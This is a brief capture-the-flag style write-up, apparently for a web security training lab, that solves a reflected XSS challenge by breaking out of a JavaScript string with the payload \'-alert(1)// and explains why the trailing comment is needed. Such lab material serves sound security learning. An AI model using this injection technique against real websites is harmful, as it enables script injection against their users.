Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

A suitable payload is   \'-alert(1)//

You can simply input that in the search field or intercept the request in burp and modify the request

The reason for the final // is to escape the quote. The reflected search term (asdf) looks like this:
<script>
    var searchTerms = 'asdf';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>

Without the final // the request would look like 
var searchTerms = '\'-alert(1)'
leaving you with an error that firefox will popup in the console:
SyntaxError: '' string literal contains an unescaped line break

So just add // to comment the last ' out
